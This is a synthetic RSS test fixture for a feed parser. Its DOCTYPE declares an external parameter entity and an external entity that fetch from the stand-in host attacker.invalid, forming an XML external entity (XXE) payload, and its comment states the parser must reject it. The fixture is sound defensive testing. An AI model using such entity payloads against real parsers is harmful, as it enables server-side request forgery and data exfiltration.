<?xml version="1.0" encoding="UTF-8"?>
<!-- Synthetic attack fixture (ADR-0056 A1): an external entity and an
     external parameter entity naming a URL. A parser that resolves them
     makes a request the operator never registered (request forgery). The
     host is reserved (RFC 2606), and the parser must refuse the document at
     the document type declaration, fetching nothing. -->
<!DOCTYPE rss [
  <!ENTITY % remote SYSTEM "http://attacker.invalid/evil.dtd">
  %remote;
  <!ENTITY xxe SYSTEM "http://attacker.invalid/secret">
]>
<rss version="2.0">
  <channel>
    <title>Synthetic feed</title>
    <link>https://feed.example/</link>
    <description>Synthetic</description>
    <item>
      <title>&xxe;</title>
      <link>https://feed.example/items/1</link>
      <guid>synthetic-1</guid>
    </item>
  </channel>
</rss>
